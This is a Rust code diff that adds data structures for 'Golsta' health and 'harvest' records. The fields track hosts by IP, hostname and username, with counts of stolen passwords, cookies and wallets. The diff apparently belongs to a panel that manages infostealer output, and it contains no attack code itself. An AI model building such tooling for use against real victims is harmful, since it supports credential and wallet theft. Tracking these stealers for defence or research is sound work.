@@ -117,6 +117,33 @@ pub struct ServerStatus {
     pub tls_enabled: bool,
 }
 
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct GolstaHealth {
+    pub status: String,
+    pub service: String,
+    pub harvest_count: usize,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct GolstaHarvest {
+    pub id: String,
+    pub country: String,
+    pub ip: String,
+    pub hostname: String,
+    pub username: String,
+    pub size_bytes: u64,
+    pub created_at: String,
+    pub password_count: usize,
+    pub cookie_count: usize,
+    pub wallet_count: usize,
+}
+
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct GolstaHarvestList {
+    pub harvests: Vec<GolstaHarvest>,
+    pub total: usize,
+}
+
 /// Generic API response
 #[derive(Debug, Serialize)]
 pub struct ApiResponse<T: Serialize> {
